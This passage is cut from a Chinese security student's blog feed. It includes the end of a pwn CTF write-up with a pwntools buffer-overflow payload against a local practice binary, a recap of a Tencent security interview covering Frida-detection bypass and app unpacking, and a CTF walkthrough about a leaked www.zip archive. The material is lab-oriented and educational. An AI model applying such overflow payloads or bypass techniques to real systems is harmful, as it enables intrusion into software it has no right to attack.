class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./pwn0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#局部变量 + ESP + EIP + 替换a1函数参数</span></span><br><span class="line">shell_code=<span class="string">b&#x27;A&#x27;</span>*<span class="number">28</span>+<span class="string">b&#x27;s&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025腾讯面试一面总结</title>
      <link href="/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>面试岗位：做安全正向防护sdk的，web和移动端都有</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314111104988.png" alt="Snipaste_2025-03-14_10-46-52"></p><p>大概面了40分钟，写代码写了20分钟</p><h2 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h2><p>巴拉巴拉告诉自己擅长什么，打算干啥</p><h2 id="2、介绍自己的项目经历（根据项目经历来问）"><a href="#2、介绍自己的项目经历（根据项目经历来问）" class="headerlink" title="2、介绍自己的项目经历（根据项目经历来问）"></a>2、介绍自己的项目经历（根据项目经历来问）</h2><p>Android 渗透印象最深刻的漏洞？</p><p>360免费版和360企业版主要的区别？</p><p>Frida检测如何绕过？</p><p>如果你是正向人员，如何隐藏Frida检测？</p><p>Android ROM魔改的思路？</p><p>APP脱壳思路？</p><p>SVC 检测绕过的方式？</p><p>小程序调试的思路？</p><p>web防护知道吗？我回答没了解太多（可以委婉一点，说自己学习能力强）</p><p>目前在学校学习那些课程？我说课程全是水课，我自己在学pwn、Android和web</p><h2 id="3、八股文"><a href="#3、八股文" class="headerlink" title="3、八股文"></a>3、八股文</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给定一个整数数组和一个目标值，找到数组中和为目标值的两个数，并返回他们的数组下标</span><br></pre></td></tr></table></figure><p>问擅长什么语言，我说c、python、java</p><p>那好用c语言来写</p><p>刚开始不太会，后来在面试官眼皮下面开始调试代码。。。最后也是磨磨唧唧写完了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line">int <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    int nums[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span> &#125;;</span><br><span class="line">    int target = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">        int tmp = nums[i];</span><br><span class="line">        <span class="keyword">for</span> (int j = i; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp + nums[j] == target) &#123;</span><br><span class="line">                <span class="title function_">printf</span>(<span class="string">&quot;%d&quot;</span>, i + j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、结果"><a href="#4、结果" class="headerlink" title="4、结果"></a>4、结果</h2><p>wait等待，如果没有二面总结，估计就凉了。个人感觉Android回答的还行哈哈哈</p><p>算法写的就是一坨，web防护不会估计有降分（检测环境那些）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>www.zip文件泄露题目实战</title>
      <link href="/2025/03/12/www-zip%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98/"/>
      <url>/2025/03/12/www-zip%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>给了这样的</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113600553.png" alt="image-20250314113600471"></p><p>登录和密码，源码泄露</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113622381.png" alt="image-20250314113622338"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113633453.png" alt="image-20250314113633380"></p><p>看到有个info.php，访问他，flag在环境变量里</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113646833.png" alt="image-20250314113646777"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
